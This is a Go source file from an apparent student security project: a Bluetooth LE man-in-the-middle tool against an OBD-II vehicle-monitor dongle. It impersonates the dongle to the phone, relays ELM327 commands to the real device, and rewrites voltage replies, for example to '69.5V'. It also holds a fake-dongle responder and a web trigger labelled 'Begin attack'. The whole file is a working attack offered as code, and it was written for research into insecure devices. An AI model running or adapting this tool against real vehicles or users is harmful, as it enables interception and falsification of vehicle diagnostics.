// Created by Shuja Hussain (shhu@itu.dk) & Harry Singh (hars@itu.dk)
// The original source code can be found on this: https://pkg.go.dev/github.com/paypal/gatt / https://pkg.go.dev/github.com/paypal/gatt
// This version has been modified to support our bachelor project in Smart Health Vehicle monitor exploitation

// This file starts the server for Man-in-the-middle attack
package main

import (
	"flag"
	"fmt"
	"log"
	"net/http"
	"strings"
	"time"

	"github.com/paypal/gatt"
	"github.com/paypal/gatt/examples/option"
	"github.com/paypal/gatt/examples/service"
)

var isPhoneConnected bool
var isDongleConnected bool
var publicDataFromPhone []byte
var publicDataFromDongle []byte
var ATcommand string
var done = make(chan struct{})

func startMsg() {
	fmt.Println("----------------------------- BrownMundeGo -----------------------------")
	fmt.Println("| Made by Shuja Hussain & Harry Singh ")
	fmt.Println("| Man-in-the-Middle attack : setting server up")
}

func startServer() {
	fileServer := http.FileServer(http.Dir("./static"))
	http.Handle("/", fileServer)
	http.HandleFunc("/targetdevice/maninthemiddleattack", manInTheMiddleAttack)

	fmt.Printf("| Starting server at port 8080\n")
	if err := http.ListenAndServe(":8080", nil); err != nil {
		log.Fatal(err)
	}
}

func NewCountTestService() *gatt.Service {

	s := gatt.NewService(gatt.MustParseUUID("0000fff0-0000-1000-8000-00805f9b34fb"))

	var phone gatt.Notifier

	s.AddCharacteristic(gatt.MustParseUUID("0000fff1-0000-1000-8000-00805f9b34fb")).HandleNotifyFunc(
		func(r gatt.Request, n gatt.Notifier) {
			go func() {
				log.Printf("TODO: indicate client when the services are changed 2 ")
				phone = n
			}()
		})
	s.AddCharacteristic(gatt.MustParseUUID("0000fff2-0000-1000-8000-00805f9b34fb")).HandleWriteFunc(
		func(r gatt.Request, data []byte) (status byte) {
			fmt.Println("| Ready to handle data from phone")
			fmt.Println("| Waiting for dongle to connect ...")
			isPhoneConnected = true
			for isDongleConnected == false {
				// waiting for dongle is connected
			}
			fmt.Println("| Phone sent: " + string(data))
			publicDataFromPhone = data // data sent to dongle
			for len(publicDataFromDongle) == 0 {
				// infinite loop waiting on notification from dongle
			}
			fmt.Println("| Notification recieved back: " + string(publicDataFromDongle))
			var dataBack = publicDataFromDongle
			publicDataFromDongle = []byte("")
			switch {
			case ATcommand == "RV":
				// modify voltage from dongle
				dataBack = []byte("69.5V\r>")
			}
			ATcommand = ""
			//publicDataFromDongle = []byte("ELM327 v1.5\r>")
			phone.Write(dataBack)
			fmt.Println("Dongle -> RPI -> Phone")
			return gatt.StatusSuccess

			/*var Z = ([]byte("ELM327 V1.5\r>"))
			var RV = ([]byte("20.5V\r>"))

			switch true {
			case strings.Contains(dataToString, "Z"):
				x.Write(Z)
			case strings.Contains(dataToString, "RV"):
				x.Write(RV)
			}*/

		})
	return s
}

func connectToPhone(gd gatt.Device) {
	gd.Handle(
		gatt.CentralConnected(func(c gatt.Central) {
			fmt.Println("| Phone is connected, connections id: ", c.ID())
		}),
		gatt.CentralDisconnected(func(c gatt.Central) { fmt.Println("Disconnect: ", c.ID()) }),
	)
	// A mandatory handler for monitoring device state.
	onStateChanged := func(d gatt.Device, s gatt.State) {
		//fmt.Printf("State: %s\n", s)
		switch s {
		case gatt.StatePoweredOn:
			// Setup GAP and GATT services for Linux implementation.
			// OS X doesn't export the access of these services.
			d.AddService(service.NewGapService("VHM-ble")) // no effect on OS X
			d.AddService(service.NewGattService())         // no effect on OS X

			// A simple count service for demo.
			s1 := NewCountTestService()
			d.AddService(s1)

			// Advertise device name and service's UUIDs.
			d.AdvertiseNameAndServices("VHM-ble", []gatt.UUID{s1.UUID()})

			// Advertise as an OpenBeacon iBeacon
			d.AdvertiseIBeacon(gatt.MustParseUUID("AA6062F098CA42118EC4193EB73CCEB6"), 1, 2, -59)

		default:
		}

	}
	gd.Init(onStateChanged)
	select {}
}

func onPeriphConnected(p gatt.Peripheral, err error) {
	fmt.Println("| Dongle is connected.")
	defer p.Device().CancelConnection(p)

	if err := p.SetMTU(500); err != nil {
		fmt.Printf("Failed to set MTU, err: %s\n", err)
	}

	// Discovery services
	ss, err := p.DiscoverServices(nil)
	if err != nil {
		fmt.Printf("Failed to discover services, err: %s\n", err)
		return
	}

	for _, s := range ss {
		msg := "Service: " + s.UUID().String()
		if len(s.Name()) > 0 {
			msg += " (" + s.Name() + ")"
		}
		fmt.Println(msg)

		// Discovery characteristics
		cs, err := p.DiscoverCharacteristics(nil, s)
		if err != nil {
			fmt.Printf("Failed to discover characteristics, err: %s\n", err)
			continue
		}

		for _, c := range cs {
			msg := "  Characteristic  " + c.UUID().String()
			if len(c.Name()) > 0 {
				msg += " (" + c.Name() + ")"
			}
			msg += "\n    properties    " + c.Properties().String()
			fmt.Println(msg)

			if strings.Contains(c.Properties().String(), "write") {
				fmt.Println("| Ready to write commands towards dongle ... ")
				isDongleConnected = true
				for isPhoneConnected {
					for len(publicDataFromPhone) != 0 {
					fmt.Println("we are inside loop")
					var stringData = string(publicDataFromPhone)
					switch {
					case strings.Contains(stringData, "AT RV"):
						ATcommand = "RV"
					}
					p.WriteCharacteristic(c, publicDataFromPhone, false)
					publicDataFromPhone = []byte("")		
				}
			}
			}

			// Read the characteristic, if possible.
			if (c.Properties() & gatt.CharRead) != 0 {
				b, err := p.ReadCharacteristic(c)
				if err != nil {
					fmt.Printf("Failed to read characteristic, err: %s\n", err)
					continue
				}
				fmt.Printf("    value         %x | %q\n", b, b)
			}

			// Discovery descriptors
			ds, err := p.DiscoverDescriptors(nil, c)
			if err != nil {
				fmt.Printf("Failed to discover descriptors, err: %s\n", err)
				continue
			}

			for _, d := range ds {
				msg := "  Descriptor      " + d.UUID().String()
				if len(d.Name()) > 0 {
					msg += " (" + d.Name() + ")"
				}
				fmt.Println(msg)

				// Read descriptor (could fail, if it's not readable)
				b, err := p.ReadDescriptor(d)
				if err != nil {
					fmt.Printf("Failed to read descriptor, err: %s\n", err)
					continue
				}
				fmt.Printf("    value         %x | %q\n", b, b)
			}

			// Subscribe the characteristic, if possible.
			if (c.Properties() & (gatt.CharNotify | gatt.CharIndicate)) != 0 {
				f := func(c *gatt.Characteristic, b []byte, err error) {
					// notify back to RPI -> Phone:

					publicDataFromDongle = b
					fmt.Printf("notified: % X | %q\n", b, b)
				}
				if err := p.SetNotifyValue(c, f); err != nil {
					fmt.Printf("Failed to subscribe characteristic, err: %s\n", err)
					continue
				}
			}

		}
		fmt.Println()
	}

	fmt.Printf("Waiting for 120 seconds to get some notifiations, if any.\n")
	time.Sleep(120 * time.Second)
}

func onPeriphDiscovered(p gatt.Peripheral, a *gatt.Advertisement, rssi int) {
	if a.LocalName == "VHM-ble" {

		// Stop scanning once we've got the peripheral we're looking for.
		p.Device().StopScanning()

		fmt.Println("| Dongle found: ")
		fmt.Printf("| Peripheral ID:%s, NAME:(%s)\n", p.ID(), p.Name())
		fmt.Println("| RSSI              =", rssi)
		fmt.Println("| Local Name        =", a.LocalName)
		fmt.Println("| TX Power Level    =", a.TxPowerLevel)
		fmt.Println("| Manufacturer Data =", a.ManufacturerData)
		fmt.Println("| Service Data      =", a.ServiceData)
		fmt.Println("")
		// Connect connects to a remote peripheral.
		fmt.Println("| Trying to connect to dongle...")
		p.Device().Connect(p)
	}
}

func onPeriphDisconnected(p gatt.Peripheral, err error) {
	fmt.Println("| Dongle is disconnected")
	close(done)
}

func onStateChanged(d gatt.Device, s gatt.State) {
	switch s {
	case gatt.StatePoweredOn:
		fmt.Println("| Scanning for VHM-ble ...")
		// When a remote peripheral is discovered, the PeripheralDiscovered Handler is called.
		d.Scan([]gatt.UUID{}, false)
		return
	default:
		d.StopScanning()
	}
}

func connectToDongle(gd gatt.Device) {
	// Register handlers.
	gd.Handle(
		gatt.PeripheralDiscovered(onPeriphDiscovered),
		gatt.PeripheralConnected(onPeriphConnected),
		gatt.PeripheralDisconnected(onPeriphDisconnected),
	)
	gd.Init(onStateChanged)
	<-done
}

func manInTheMiddleAttack(w http.ResponseWriter, r *http.Request) {
	fmt.Println("| {WEB} Clicked on 'Begin attack'")
	beginAttack()
}

func beginAttack() {
	isPhoneConnected = false
	isDongleConnected = false

	fmt.Println("| Trying to create gattDevice ...")
	gattDevice, err := gatt.NewDevice(option.DefaultClientOptions...)
	if err != nil {
		log.Fatalf("> Failed to open device, err: %s\n", err)
		return
	}
	fmt.Println("| gattDevice succesfully created.")
	fmt.Println("| Trying to capture connection between Raspberry PI with mobile phone ...")

	go connectToPhone(gattDevice)

	for isPhoneConnected == false {
		// infinite loop until phone is connected
	}

	// Dongle is connected
	fmt.Println("| Trying to capture connection between Raspberry PI with VHM-ble")
	connectToDongle(gattDevice)
	//fakeDongle()

}


func fakeOutput() {
	for len(publicDataFromPhone) != 0 {
		var stringData = string(publicDataFromPhone)
		switch {
		case strings.Contains(stringData, "ATZ"):
			publicDataFromDongle = []byte("ELM327 v1.5\r>")
		case strings.Contains(stringData, "ATD"):
			publicDataFromDongle = []byte("OK\r\n>OK\r>")
		case strings.Contains(stringData, "ATH1"):
			publicDataFromDongle = []byte("OK\r\n>OK\r>")
		case strings.Contains(stringData, "ATL0"):
			publicDataFromDongle = []byte("OK\r>OK\r>")
		case strings.Contains(stringData, "ATS0"):
			publicDataFromDongle = []byte("OK\r>OK\r>")
		case strings.Contains(stringData, "ATSP0"):
			publicDataFromDongle = []byte("OK\r>OK\r>")
		case strings.Contains(stringData, "0100"):
			publicDataFromDongle = []byte("7E8064120A005B011\r>")
		case strings.Contains(stringData, "0120"):
			publicDataFromDongle = []byte("86F1114100BE3FB8118F\r\r>")
		case strings.Contains(stringData, "0130"):
			publicDataFromDongle = []byte("83F1117F011217\r\r>83F1117F011217\r\r>")
		case strings.Contains(stringData, "013C"):
			publicDataFromDongle = []byte("83F1117F011217\r\r>")
		case strings.Contains(stringData, "ATMA"):
			publicDataFromDongle = []byte("?\r>?\r>")
		case strings.Contains(stringData, "AT RV"):
			ATcommand = "RV"
			publicDataFromDongle = []byte("12.3V\r>")
		
		default:
			publicDataFromDongle = []byte("OK\r>")
			fmt.Println("Unknown command: '" + stringData + "'")
		}
		publicDataFromPhone = []byte("")
	}
}

func fakeDongle() {
	isDongleConnected = true
	fmt.Println("------------ FAKE DONGLE STARTED ------------")
	fmt.Println("| Ready to write commands towards dongle ... ")

	for isPhoneConnected {
		fakeOutput()
	}
}


func main() {
	cmd := flag.String("autostart", "", "")
	flag.Parse()
	if string(*cmd) == "on" {
		startMsg()
		fmt.Println("| Autostart is on \n| Running without server")
		beginAttack()
	} else {
		startMsg()
		startServer()
	}
}
